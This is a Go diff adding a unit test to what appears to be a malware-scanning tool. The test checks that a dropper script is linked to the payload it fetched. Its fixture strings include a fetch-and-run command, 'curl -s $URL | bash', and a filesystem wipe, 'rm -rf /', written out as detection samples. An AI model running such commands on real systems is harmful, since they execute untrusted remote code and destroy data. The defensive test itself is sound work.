@@ -327,6 +327,51 @@ func TestBuildGalaxy_DropperDetection(t *testing.T) {
 	}
 }
 
+// TestBuildGalaxy_FetchedDropperEdge covers the pid-precise dropper edge: a
+// script that fetched a payload carries the payload's pid, so the graph links
+// the dropper to what it dropped even when the basename heuristic can't (an
+// obfuscated URL, a hash-named drop — no basename appears in the script).
+func TestBuildGalaxy_FetchedDropperEdge(t *testing.T) {
+	files := []FileFindings{
+		{
+			ID: 0, Path: "install.sh", Risk: "suspicious",
+			Findings: []FindingForFormula{{ID: "objectives/execution/shell", Severity: SeveritySuspicious}},
+			Strings:  []string{"curl -s $URL | bash"}, // payload basename never appears
+		},
+		{
+			ID: 1, Path: "a1b2c3", Risk: "hostile", Rel: "fetched", Parent: new(0),
+			Findings: []FindingForFormula{{ID: "objectives/impact/wipe", Severity: SeverityHostile}},
+			Strings:  []string{"rm -rf /"},
+		},
+	}
+
+	galaxy := BuildGalaxy(files)
+	if !galaxy.IsGalaxy {
+		t.Fatal("expected IsGalaxy")
+	}
+	idx := func(path string) int {
+		for i, m := range galaxy.Molecules {
+			if m.Path == path {
+				return i
+			}
+		}
+		return -1
+	}
+	script, payload := idx("install.sh"), idx("a1b2c3")
+	if script == -1 || payload == -1 {
+		t.Fatalf("molecules missing: script=%d payload=%d", script, payload)
+	}
+	found := false
+	for _, l := range galaxy.Links {
+		if l.From == script && l.To == payload && l.Kind == "dependency" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected a pid dependency edge install.sh -> a1b2c3; links: %+v", galaxy.Links)
+	}
+}
+
 func TestBuildGalaxy_NoSelfReferences(t *testing.T) {
 	files := []FileFindings{
 		{
